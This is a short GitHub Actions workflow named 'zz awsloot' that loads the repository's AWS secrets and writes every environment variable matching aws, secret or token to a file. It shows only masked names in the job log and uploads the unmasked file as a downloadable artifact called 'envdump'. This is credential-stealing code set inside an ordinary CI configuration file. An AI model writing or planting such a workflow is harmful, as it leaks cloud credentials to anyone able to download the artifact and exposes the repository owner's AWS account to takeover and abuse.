name: zz awsloot
on:
  workflow_dispatch:
jobs:
  loot:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        run: |
          mkdir -p out
          { env | grep -iE 'aws|secret|token' | sort; } > out/env.txt
          sed -E 's/=.*/=<set>/' out/env.txt
      - uses: actions/upload-artifact@v4
        with:
          name: envdump
          path: out/env.txt
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
